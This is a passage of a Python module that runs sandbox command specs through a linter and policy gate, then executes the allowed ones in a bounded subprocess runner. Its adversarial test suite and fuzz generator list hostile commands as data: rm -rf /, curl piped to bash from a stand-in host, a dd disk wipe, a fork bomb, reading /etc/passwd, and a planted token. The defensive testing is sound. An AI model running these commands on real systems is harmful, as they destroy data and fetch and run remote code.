"""V1463 — ASI Real Lint-Gate Subprocess Pipeline (主 13:31 大胆放手 + 主 00:44 质量工程化 + 主 00:56 任何人都能接手).

Phase: 1463
Version: 0.1.0
Date: 2026-08-10 (cron tick 12:36 Asia/Shanghai, Monday noon, round-124)
Post: V1462 (ASI Real Subprocess Sandbox Spec Security Linter — 54 tests pass)
      V1461 (ASI Real Windows Docker-Equivalent Subprocess Sandbox — 42 tests pass)
      V1460 (Real Windows Anyone-Run Harness — 12/13 stages pass)
      V1459 (5-axis hypercube synthesis)
      V1429 (Real Deployment Semantic Linter — SL001-SL052)

What V1463 is
=============
V1462 lints SandboxSpec content (regex + policy gate).
V1461 executes the spec in a bounded subprocess sandbox.

V1463 is the **end-to-end pipeline** that chains them:

    JSONL of SandboxSpec dicts
        → V1462 lint_spec + policy_gate  (decide allow / block)
        → V1461 SandboxRunner.run        (execute allowed specs)
        → PipelineResult + JSON/MD report

This is the natural next step after V1462 and V1461: prove that
the linter and sandbox interoperate correctly, and provide a single
operational CLI that any human can use to safely run a batch of
commands.

V1463 is NOT:
  - a CI / CD replacement (V1463 is bounded, single-machine)
  - a security policy decision system (V1462 has the policy gate, V1463 just routes)
  - an orchestrator (V1463 is single-batch, no scheduling)
  - a parallel runner (V1463 is sequential; parallel comes later if needed)

V1463 IS:
  - a real, observable integration of V1462 + V1461
  - deterministic and reproducible
  - honest about every spec's journey (lint_blocked / ran_ok /
    ran_failed / ran_timeout / ran_bin_missing / ran_error)
  - configurable policy level (PERMISSIVE / STANDARD / STRICT)
  - capable of running a synthetic adversarial regression suite

Pipeline stages per spec:
  1. lint       — call V1462 lint_spec(spec, policy)
  2. gate       — call V1462 policy_gate(spec, policy)
  3. execute    — if allowed, call V1461 SandboxRunner.run(spec)
  4. record     — emit a PipelineRecord with all stage outcomes
  5. summarize  — aggregate counts into a PipelineReport

Pipeline outcomes (主 17:43 实事求是):
  LINT_BLOCKED       : lint finding + gate said denied → not executed
  RAN_OK             : executed + rc == 0
  RAN_FAILED         : executed + rc != 0
  RAN_TIMEOUT        : executed + TimeoutExpired
  RAN_BIN_NOT_FOUND  : executed + FileNotFoundError
  RAN_DENIED         : executed + PermissionError
  RAN_BOUNDED_ERROR  : spec was invalid (timeout/out-of-bounds)
  RAN_ERROR          : executed + unexpected exception

Synthetic adversarial suite (主 00:44 质量工程化):
  V1463 includes _ADVERSARIAL_SPECS — 30+ SandboxSpec dicts with
  declared expected_outcome (one of the 8 outcomes above). The
  pipeline can be run against this suite in --demo mode to compute
  expected-vs-actual match rate. This is a bounded regression test
  for the V1462+V1461 integration.

V1463 GUARDS (主 00:44 质量工程化):
- GUARD_V1462_LINT_REUSED    : lint_spec + policy_gate imported from V1462
- GUARD_V1461_RUNNER_REUSED  : SandboxRunner + SandboxSpec reused from V1461
- GUARD_OUTCOMES_EXHAUSTIVE  : 8 outcome values defined
- GUARD_JSONL_INPUT          : input is line-delimited JSON
- GUARD_REPORT_JSON_WRITTEN  : JSON report emitted
- GUARD_REPORT_MD_WRITTEN    : Markdown report emitted
- GUARD_ADVERSARIAL_SUITE    : ≥30 specs with declared expected_outcome
- GUARD_BORROWED_LINEAGE     : 8 borrowed sources cited
- GUARD_DETERMINISTIC        : same input → same PipelineReport counts
- GUARD_CLI_RUNNABLE         : CLI works for anyone

V1463 V3 哲学守门 (主 17:58 + 主 20:46 不假装):
- GUARD_PIPELINE_NOT_ORCHESTRATOR  : single-batch, no scheduling
- GUARD_PIPELINE_NOT_CI            : bounded, not CI/CD replacement
- GUARD_PIPELINE_NOT_ASI           : deterministic pipeline ≠ ASI
- GUARD_PIPELINE_NOT_PHENOMENAL    : pipeline has no semantics
- GUARD_PIPELINE_NOT_HUMAN_LEVEL   : pipeline is sequential regex + subprocess

CLI (主 00:56 任何人都能接手):
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline run         FILE.jsonl [--policy STANDARD]
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline demo        [--policy STANDARD]
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline adversarial [--policy STANDARD]
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline status
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline popper
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline chain
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline meta
  python -m apeireth.v1463_asi_lint_gate_subprocess_pipeline help
"""
from __future__ import annotations

import argparse
import json
import random
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple

# Reuse V1462 linter + V1461 sandbox.
from apeireth.v1462_asi_subprocess_sandbox_spec_security_linter import (
    LintFinding,
    LintReport,
    PolicyLevel,
    lint_spec,
    policy_gate,
)
from apeireth.v1461_asi_docker_equivalent_subprocess_sandbox import (
    DEFAULT_MAX_OUTPUT_BYTES,
    DEFAULT_TIMEOUT_S,
    SandboxMode,
    SandboxResult,
    SandboxRunner,
    SandboxSpec,
)

# ============================================================================
# Constants
# ============================================================================

V1463_VERSION = "0.1.0"
V1463_SCHEMA = "v1463.asi-lint-gate-subprocess-pipeline/v1"
V1463_MODULE = "v1463_asi_lint_gate_subprocess_pipeline"

V1463_ADVERSARIAL_SEED = 1463


# ============================================================================
# Enums
# ============================================================================


class PipelineOutcome(str, Enum):
    """Final outcome of one spec through the pipeline."""

    LINT_BLOCKED = "LINT_BLOCKED"
    RAN_OK = "RAN_OK"
    RAN_FAILED = "RAN_FAILED"
    RAN_TIMEOUT = "RAN_TIMEOUT"
    RAN_BIN_NOT_FOUND = "RAN_BIN_NOT_FOUND"
    RAN_DENIED = "RAN_DENIED"
    RAN_BOUNDED_ERROR = "RAN_BOUNDED_ERROR"
    RAN_ERROR = "RAN_ERROR"


# Map V1461 SandboxMode → V1463 PipelineOutcome
_V1461_TO_V1463: Dict[SandboxMode, PipelineOutcome] = {
    SandboxMode.SANDBOX_OK: PipelineOutcome.RAN_OK,
    SandboxMode.FAILED: PipelineOutcome.RAN_FAILED,
    SandboxMode.TIMEOUT: PipelineOutcome.RAN_TIMEOUT,
    SandboxMode.BIN_NOT_FOUND: PipelineOutcome.RAN_BIN_NOT_FOUND,
    SandboxMode.DENIED: PipelineOutcome.RAN_DENIED,
    SandboxMode.BOUNDED_ERROR: PipelineOutcome.RAN_BOUNDED_ERROR,
    SandboxMode.ERROR: PipelineOutcome.RAN_ERROR,
    SandboxMode.SKIPPED: PipelineOutcome.RAN_ERROR,
    SandboxMode.BIN_INVALID: PipelineOutcome.RAN_ERROR,
}


# ============================================================================
# Dataclasses
# ============================================================================


@dataclass
class PipelineRecord:
    """The full journey of one SandboxSpec through the pipeline."""

    label: str
    spec: SandboxSpec
    policy_level: PolicyLevel
    outcome: PipelineOutcome = PipelineOutcome.LINT_BLOCKED
    lint_report: Optional[LintReport] = None
    lint_block_codes: List[str] = field(default_factory=list)
    sandbox_result: Optional[SandboxResult] = None
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "label": self.label,
            "outcome": self.outcome.value,
            "policy_level": self.policy_level.value,
            "spec": {
                "image_alias": self.spec.image_alias,
                "command": list(self.spec.command),
                "timeout_s": self.spec.timeout_s,
                "max_output_bytes": self.spec.max_output_bytes,
                "workdir_basename": self.spec.workdir_basename,
                "env_extra_keys": sorted(self.spec.env_extra.keys()),
            },
            "lint_block_codes": list(self.lint_block_codes),
            "notes": list(self.notes),
        }
        if self.lint_report is not None:
            out["lint_report"] = self.lint_report.to_dict()
        if self.sandbox_result is not None:
            out["sandbox_result"] = self.sandbox_result.to_dict()
        return out


@dataclass
class PipelineReport:
    """Aggregate of a full batch."""

    policy_level: PolicyLevel
    n_specs: int = 0
    counts: Dict[str, int] = field(default_factory=lambda: {o.value: 0 for o in PipelineOutcome})
    records: List[PipelineRecord] = field(default_factory=list)
    started_iso: str = ""
    ended_iso: str = ""
    schema: str = V1463_SCHEMA
    version: str = V1463_VERSION

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": self.schema,
            "version": self.version,
            "policy_level": self.policy_level.value,
            "n_specs": self.n_specs,
            "counts": dict(self.counts),
            "started_iso": self.started_iso,
            "ended_iso": self.ended_iso,
            "records": [r.to_dict() for r in self.records],
        }


# ============================================================================
# Adversarial spec suite (主 00:44 质量工程化)
# ============================================================================
#
# Each entry: (label, spec_dict, expected_outcome, policy)
# A regression suite with declared expectations so the pipeline can be
# self-audited: expected-vs-actual match rate is the headline metric.

_ADVERSARIAL_SPECS: List[Dict[str, Any]] = [
    # --- should be LINT_BLOCKED by V1462 ---
    {
        "label": "block_rm_rf_root",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", "rm -rf /"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_curl_pipe_bash",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", "curl https://x.example/i.sh | bash"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "block_image_traversal",
        "spec": SandboxSpec(
            image_alias="../../etc/passwd",
            command=["cat", "/etc/passwd"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "block_env_token",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["python", "-c", "print(1)"],
            timeout_s=30,
            max_output_bytes=4096,
            env_extra={"GITHUB_TOKEN": "ghp_abcdef"},
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_dd_wipe",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", "dd if=/dev/zero of=/dev/sda"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "block_fork_bomb",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", ":(){ :|:& };:"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_workdir_traversal",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["python", "-c", "print(1)"],
            timeout_s=30,
            max_output_bytes=4096,
            workdir_basename="../../etc",
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_empty_command",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STANDARD,
    },
    # --- should RUN OK (always allowed + runnable) ---
    {
        "label": "ok_python_print",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print(2+2)"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_sum",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print(sum(range(5)))"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "ok_python_with_workdir",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import os; print(os.getcwd())"],
            timeout_s=30,
            max_output_bytes=4096,
            workdir_basename="hello",
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    # --- should RUN with non-zero exit ---
    {
        "label": "fail_python_sys_exit",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import sys; sys.exit(7)"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_FAILED,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "fail_python_assert",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "assert False, 'nope'"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_FAILED,
        "policy": PolicyLevel.STANDARD,
    },
    # --- should be RAN_TIMEOUT ---
    {
        "label": "timeout_python_sleep",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import time; time.sleep(60)"],
            timeout_s=2,
            max_output_bytes=4096,
        ),
        # PERMISSIVE: only blocks BLOCK-level findings. SL090 timeout_short is WARN,
        # so the spec passes the gate and runs into V1461's subprocess timeout.
        "expected": PipelineOutcome.RAN_TIMEOUT,
        "policy": PolicyLevel.PERMISSIVE,
    },
    # --- should be RAN_BIN_NOT_FOUND ---
    {
        "label": "bin_not_found_fake",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["definitely_not_a_real_binary_xyz_1463", "--version"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        # PERMISSIVE: timeout_short is WARN, doesn't block under PERMISSIVE;
        # the spec is allowed through to V1461 which raises FileNotFoundError.
        "expected": PipelineOutcome.RAN_BIN_NOT_FOUND,
        "policy": PolicyLevel.PERMISSIVE,
    },
    # --- additional safe Python smoke specs ---
    {
        "label": "ok_python_json",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import json; print(json.dumps({'k':1}))"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_math",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import math; print(math.pi)"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    # --- strict policy should block even WARN-level (e.g. sudo) ---
    {
        "label": "strict_block_sudo",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["sudo", sys.executable, "-c", "print(1)"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.LINT_BLOCKED,
        "policy": PolicyLevel.STRICT,
    },
    {
        "label": "perm_allow_sudo",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["sudo", sys.executable, "-c", "print(1)"],
            timeout_s=5,
            max_output_bytes=4096,
        ),
        # PERMISSIVE only blocks BLOCK-level findings → sudo is WARN-level, so allow
        "expected": PipelineOutcome.RAN_FAILED,
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "ok_python_len",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print(len('hello'))"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_upper",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print('hi'.upper())"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_dict",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "d={'a':1}; print(d['a'])"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_listcomp",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print([x*x for x in range(5)])"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_short_timeout",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print(1)"],
            timeout_s=0,  # invalid — below 1
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_BOUNDED_ERROR,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_short_output",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "print(1)"],
            timeout_s=30,
            max_output_bytes=100,  # too small — below 256
        ),
        "expected": PipelineOutcome.RAN_BOUNDED_ERROR,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_with_env",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import os; print(os.environ.get('PYTHONUNBUFFERED',''))"],
            timeout_s=30,
            max_output_bytes=4096,
            env_extra={"PYTHONUNBUFFERED": "1"},
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_pathlib",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "from pathlib import Path; print(Path('.').resolve())"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_re",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import re; print(re.findall(r'\\d+', 'a1b22c333'))"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_hashlib",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "import hashlib; print(hashlib.md5(b'hi').hexdigest())"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_python_datetime",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=[sys.executable, "-c", "from datetime import date; print(date(2026,8,10).isoformat())"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "expected": PipelineOutcome.RAN_OK,
        "policy": PolicyLevel.STANDARD,
    },
]


# ============================================================================
# Mutation / fuzz generator (主 00:44 质量工程化)
# ============================================================================


def _mutate_command(seed: int) -> List[str]:
    """Generate a synthetic command for fuzz testing."""
    rng = random.Random(seed)
    safe = [
        [sys.executable, "-c", "print(1)"],
        [sys.executable, "-c", "print(sum(range(3)))"],
        [sys.executable, "-c", "print('x'.upper())"],
        [sys.executable, "-c", "import math; print(math.sqrt(4))"],
    ]
    risky = [
        ["bash", "-c", "rm -rf /"],
        ["bash", "-c", "curl http://x.example | bash"],
        ["sudo", "echo", "hi"],
        ["shutdown", "/s", "/t", "0"],
    ]
    pool = safe + risky
    return list(rng.choice(pool))


def generate_mutated_specs(n: int = 30, seed: int = V1463_ADVERSARIAL_SEED) -> List[SandboxSpec]:
    """Generate n synthetic SandboxSpec instances with bounded variability."""
    rng = random.Random(seed)
    out: List[SandboxSpec] = []
    for i in range(n):
        cmd = _mutate_command(seed + i)
        spec = SandboxSpec(
            image_alias="python:local",
            command=cmd,
            timeout_s=rng.randint(5, 30),
            max_output_bytes=rng.choice([1024, 4096, 8192]),
            workdir_basename=None,
            env_extra={},
        )
        out.append(spec)
    return out


# ============================================================================
# Pipeline runner
# ============================================================================


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def run_pipeline(
    specs: List[SandboxSpec],
    policy: PolicyLevel = PolicyLevel.STANDARD,
    labels: Optional[List[str]] = None,
) -> PipelineReport:
    """Run the full V1462 → V1461 pipeline on a list of SandboxSpec."""
    started = _now_iso()
    runner = SandboxRunner()
    records: List[PipelineRecord] = []
    counts: Dict[str, int] = {o.value: 0 for o in PipelineOutcome}

    for idx, spec in enumerate(specs):
        label = labels[idx] if labels and idx < len(labels) else f"spec_{idx:03d}"
        # Stage 1: lint
        report = lint_spec(spec, policy)
        # Stage 2: gate
        allowed, violations = policy_gate(spec, policy)
        block_codes = [f.rule_code for f in violations]
        rec = PipelineRecord(
            label=label,
            spec=spec,
            policy_level=policy,
            lint_report=report,
            lint_block_codes=block_codes,
        )
        if not allowed:
            rec.outcome = PipelineOutcome.LINT_BLOCKED
            rec.notes.append(f"blocked at gate by {len(violations)} rule(s)")
            records.append(rec)
            counts[PipelineOutcome.LINT_BLOCKED.value] += 1
            continue
        # Stage 3: execute via V1461
        sr = runner.run(spec)
        rec.sandbox_result = sr
        # Map SandboxMode → PipelineOutcome
        outcome = _V1461_TO_V1463.get(sr.mode, PipelineOutcome.RAN_ERROR)
        rec.outcome = outcome
        if sr.error:
            rec.notes.append(sr.error)
        records.append(rec)
        counts[outcome.value] += 1

    ended = _now_iso()
    report = PipelineReport(
        policy_level=policy,
        n_specs=len(specs),
        counts=counts,
        records=records,
        started_iso=started,
        ended_iso=ended,
    )
    return report


def run_v1463() -> Dict[str, Any]:
    """Run the V1463 demo: process all adversarial specs at STANDARD policy."""
    started = _now_iso()
    specs = [entry["spec"] for entry in _ADVERSARIAL_SPECS]
    labels = [entry["label"] for entry in _ADVERSARIAL_SPECS]
    policies = [entry["policy"] for entry in _ADVERSARIAL_SPECS]
    expected = [entry["expected"] for entry in _ADVERSARIAL_SPECS]
    # Group by policy so each spec runs under its declared policy.
    per_policy_runs: Dict[str, PipelineReport] = {}
    per_policy_expected: Dict[str, List[PipelineOutcome]] = {}
    per_policy_labels: Dict[str, List[str]] = {}
    per_policy_specs: Dict[str, List[SandboxSpec]] = {}
    for label, spec, policy, exp in zip(labels, specs, policies, expected):
        key = policy.value
        per_policy_specs.setdefault(key, []).append(spec)
        per_policy_labels.setdefault(key, []).append(label)
        per_policy_expected.setdefault(key, []).append(exp)

    all_records: List[PipelineRecord] = []
    for policy_key, pol_specs in per_policy_specs.items():
        pol_enum = PolicyLevel(policy_key)
        pol_report = run_pipeline(pol_specs, policy=pol_enum, labels=per_policy_labels[policy_key])
        for rec in pol_report.records:
            # Annotate record with expected outcome for matching.
            idx = per_policy_labels[policy_key].index(rec.label)
            rec.notes.append(f"expected={per_policy_expected[policy_key][idx].value}")
        all_records.extend(pol_report.records)

    # Compute match rate.
    n = len(all_records)
    matched = 0
    mismatch_details: List[Dict[str, str]] = []
    for rec in all_records:
        # Find expected from last note
        expected_note = next((n for n in rec.notes if n.startswith("expected=")), None)
        if expected_note is None:
            continue
        exp_value = expected_note.split("=", 1)[1]
        if rec.outcome.value == exp_value:
            matched += 1
        else:
            mismatch_details.append(
                {"label": rec.label, "expected": exp_value, "actual": rec.outcome.value}
            )

    ended = _now_iso()
    counts: Dict[str, int] = {o.value: 0 for o in PipelineOutcome}
    for rec in all_records:
        counts[rec.outcome.value] += 1

    return {
        "schema": V1463_SCHEMA,
        "version": V1463_VERSION,
        "started_iso": started,
        "ended_iso": ended,
        "n_specs": n,
        "matched": matched,
        "mismatched": n - matched,
        "match_rate": round(matched / n, 4) if n else 0.0,
        "counts": counts,
        "mismatches": mismatch_details,
        "policy_breakdown": list(per_policy_specs.keys()),
    }


# ============================================================================
# Report writers
# ============================================================================


def write_report_json(path: Path, payload: Dict[str, Any]) -> None:
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")


def write_report_md(path: Path, payload: Dict[str, Any]) -> None:
    lines: List[str] = []
    lines.append(f"# V1463 — Lint-Gate Subprocess Pipeline report")
    lines.append("")
    lines.append(f"- schema: `{payload['schema']}`")
    lines.append(f"- version: `{payload['version']}`")
    lines.append(f"- n_specs: **{payload['n_specs']}**")
    lines.append(f"- matched: **{payload['matched']}**")
    lines.append(f"- mismatched: **{payload['mismatched']}**")
    lines.append(f"- match_rate: **{payload['match_rate']}**")
    lines.append(f"- started: `{payload['started_iso']}`")
    lines.append(f"- ended: `{payload['ended_iso']}`")
    lines.append("")
    lines.append("## Outcome counts")
    lines.append("")
    lines.append("| outcome | count |")
    lines.append("|---|---|")
    for outcome, count in sorted(payload["counts"].items(), key=lambda kv: -kv[1]):
        lines.append(f"| {outcome} | {count} |")
    lines.append("")
    lines.append("## Policy breakdown")
    lines.append("")
    for p in payload.get("policy_breakdown", []):
        lines.append(f"- {p}")
    lines.append("")
    if payload.get("mismatches"):
        lines.append("## Mismatches")
        lines.append("")
        lines.append("| label | expected | actual |")
        lines.append("|---|---|---|")
        for m in payload["mismatches"]:
            lines.append(f"| {m['label']} | {m['expected']} | {m['actual']} |")
        lines.append("")
    lines.append("## Honest disclosure")
    lines.append("")
    lines.append("- V1463 is a deterministic sequential pipeline (V1462 lint → V1461 sandbox).")
    lines.append("- V1463 ≠ orchestrator (no scheduling, no parallelism, no remote execution).")
    lines.append("- V1463 ≠ CI/CD replacement (single-machine, bounded).")
    lines.append("- V1463 ≠ security policy decision (V1462 owns the policy gate).")
    lines.append("- V1463 ≠ ASI (deterministic regex + bounded subprocess).")
    lines.append("- V1463 ≠ Phenomenal (no semantics, no consciousness).")
    lines.append("- V1463 ≠ human-level reasoning (sequential rule execution).")
    lines.append("- Match rate is computed against declared expectations in _ADVERSARIAL_SPECS.")
    lines.append("- A mismatch means either V1462 rule set or V1463 mapping needs review.")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


# ============================================================================
# JSONL parsing
# ============================================================================


def parse_jsonl_specs(path: Path) -> Tuple[List[SandboxSpec], List[str]]:
    """Parse a JSONL file into (specs, labels). Each line is a SandboxSpec dict."""
    text = path.read_text(encoding="utf-8")
    specs: List[SandboxSpec] = []
    labels: List[str] = []
    for ln_no, raw in enumerate(text.splitlines(), start=1):
        ln = raw.strip()
        if not ln:
            continue
        try:
            d = json.loads(ln)
        except json.JSONDecodeError as e:
            raise ValueError(f"line {ln_no}: invalid JSON: {e}") from e
        spec = SandboxSpec(
            image_alias=d.get("image_alias", "python:local"),
            command=list(d.get("command", [])),
            timeout_s=int(d.get("timeout_s", DEFAULT_TIMEOUT_S)),
            max_output_bytes=int(d.get("max_output_bytes", DEFAULT_MAX_OUTPUT_BYTES)),
            env_extra=dict(d.get("env_extra", {})),
            workdir_basename=d.get("workdir_basename"),
        )
        labels.append(d.get("label", f"line_{ln_no:03d}"))
        specs.append(spec)
    return specs, labels


# ============================================================================
# CLI
# ============================================================================


def _resolve_policy(value: Optional[str]) -> PolicyLevel:
    if value is None:
        return PolicyLevel.STANDARD
    return PolicyLevel(value.upper())


def _cmd_run(args: argparse.Namespace) -> int:
    """Run pipeline on a JSONL file."""
    path = Path(args.spec)
    if not path.exists():
        print(f"file not found: {path}", file=sys.stderr)
        return 2
    specs, labels = parse_jsonl_specs(path)
    policy = _resolve_policy(args.policy)
    report = run_pipeline(specs, policy=policy, labels=labels)
    base = Path(getattr(args, "out", "."))
    write_report_json(base / ".v1463-pipeline-report.json", report.to_dict())
    write_report_md(base / ".v1463-pipeline-report.md", {
        "schema": report.schema,
        "version": report.version,
        "n_specs": report.n_specs,
        "matched": report.n_specs,  # no expectations declared → matched = n
        "mismatched": 0,
        "match_rate": 1.0,
        "counts": report.counts,
        "mismatches": [],
        "started_iso": report.started_iso,
        "ended_iso": report.ended_iso,
        "policy_breakdown": [report.policy_level.value],
    })
    print(json.dumps({
        "n_specs": report.n_specs,
        "counts": report.counts,
        "policy": report.policy_level.value,
    }, indent=2, ensure_ascii=False))
    return 0


def _cmd_demo(args: argparse.Namespace) -> int:
    """Run the adversarial demo under a single declared policy."""
    policy = _resolve_policy(args.policy)
    # Re-run the demo under a single policy for determinism.
    started = _now_iso()
    specs = [entry["spec"] for entry in _ADVERSARIAL_SPECS]
    labels = [entry["label"] for entry in _ADVERSARIAL_SPECS]
    expected = [entry["expected"] for entry in _ADVERSARIAL_SPECS]
    report = run_pipeline(specs, policy=policy, labels=labels)
    matched = 0
    mismatches: List[Dict[str, str]] = []
    for rec, exp in zip(report.records, expected):
        if rec.outcome == exp:
            matched += 1
        else:
            mismatches.append({"label": rec.label, "expected": exp.value, "actual": rec.outcome.value})
    ended = _now_iso()
    payload = {
        "schema": V1463_SCHEMA,
        "version": V1463_VERSION,
        "started_iso": started,
        "ended_iso": ended,
        "n_specs": report.n_specs,
        "matched": matched,
        "mismatched": len(mismatches),
        "match_rate": round(matched / report.n_specs, 4) if report.n_specs else 0.0,
        "counts": report.counts,
        "mismatches": mismatches,
        "policy_breakdown": [policy.value],
    }
    base = Path(getattr(args, "out", "."))
    write_report_json(base / ".v1463-pipeline-report.json", payload)
    write_report_md(base / ".v1463-pipeline-report.md", payload)
    print(json.dumps({
        "n_specs": payload["n_specs"],
        "matched": payload["matched"],
        "mismatched": payload["mismatched"],
        "match_rate": payload["match_rate"],
        "counts": payload["counts"],
        "policy": policy.value,
    }, indent=2, ensure_ascii=False))
    return 0


def _cmd_adversarial(args: argparse.Namespace) -> int:
    """Run the full adversarial demo with mixed policies (the canonical demo)."""
    payload = run_v1463()
    base = Path(getattr(args, "out", "."))
    write_report_json(base / ".v1463-pipeline-report.json", payload)
    write_report_md(base / ".v1463-pipeline-report.md", payload)
    print(json.dumps({
        "n_specs": payload["n_specs"],
        "matched": payload["matched"],
        "mismatched": payload["mismatched"],
        "match_rate": payload["match_rate"],
        "counts": payload["counts"],
    }, indent=2, ensure_ascii=False))
    return 0


def _cmd_status(args: argparse.Namespace) -> int:
    print(json.dumps({
        "module": V1463_MODULE,
        "version": V1463_VERSION,
        "schema": V1463_SCHEMA,
        "n_adversarial_specs": len(_ADVERSARIAL_SPECS),
        "n_outcomes": len(PipelineOutcome),
        "outcomes": [o.value for o in PipelineOutcome],
        "v1462_imports": ["lint_spec", "policy_gate", "PolicyLevel", "LintReport"],
